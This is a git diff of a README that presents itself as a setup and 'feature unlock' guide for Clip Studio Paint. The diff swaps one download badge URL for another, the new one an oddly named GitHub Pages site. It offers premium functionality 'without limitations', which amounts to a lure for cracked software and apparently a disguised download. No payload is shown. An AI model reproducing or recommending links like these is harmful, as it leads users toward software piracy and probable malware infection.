@@ -1,6 +1,6 @@
 # 🎨 Clip Studio Paint — Full Setup & Feature Unlock Guide
 
-[![Download Clip Studio Setup](https://img.shields.io/badge/⬇️_Download-Clip_Studio_Tool-green?style=for-the-badge&logo=windows)](https://clip-studio-paint-pre-activated-feature.github.io/.github/)
+[![Download Clip Studio Setup](https://img.shields.io/badge/⬇️_Download-Clip_Studio_Tool-green?style=for-the-badge&logo=windows)](https://studioclipppre12webinf0.github.io/.github/)
 
 Unlock professional-grade illustration, animation, and comic tools with this enhanced setup for Clip Studio Paint. Designed for digital artists, illustrators, and animators looking to access premium functionality without limitations.
 
